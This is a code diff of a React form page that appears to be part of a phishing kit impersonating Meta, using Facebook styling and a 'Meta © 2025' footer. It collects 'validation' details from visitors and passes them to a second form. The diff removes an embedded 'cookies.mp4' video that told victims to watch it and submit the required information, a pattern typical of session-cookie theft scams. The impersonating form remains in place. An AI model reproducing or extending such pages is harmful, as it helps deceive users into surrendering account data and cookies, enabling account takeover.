@@ -13,7 +13,6 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import { formOneSchema, type FormOne } from "@shared/schema";
-//import { sendFormOne } from "@/lib/emailjs";
 import { useMobile } from "@/hooks/use-mobile";
 import { Search } from "lucide-react";
 import React from 'react';
@@ -45,7 +44,6 @@ export default function FormOne() {
         throw new Error('Failed to submit form');
       }
 
-      // Store validation data for form two
       localStorage.setItem('validation_data', JSON.stringify(data));
       setLocation("/form-two");
     } catch (error) {
@@ -89,29 +87,6 @@ export default function FormOne() {
             <p>
               Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
             </p>
-          </div>
-
-          <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
-            <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>
-
-            <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
-              <video
-                className="w-full h-full"
-                controls
-                playsInline
-                preload="auto"
-              >
-                <source
-                  src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
-                  type="video/mp4"
-                />
-                Your browser does not support the video tag.
-              </video>
-            </div>
-
-            <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
-              Must Watch the video and submit required information correctly.
-            </h3>
           </div>
 
           <Form {...form}>
@@ -175,11 +150,6 @@ export default function FormOne() {
       <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
         Meta © 2025
       </div>
-      <style>{`
-        .video-container {
-          box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-        }
-      `}</style>
     </div>
   );
 }
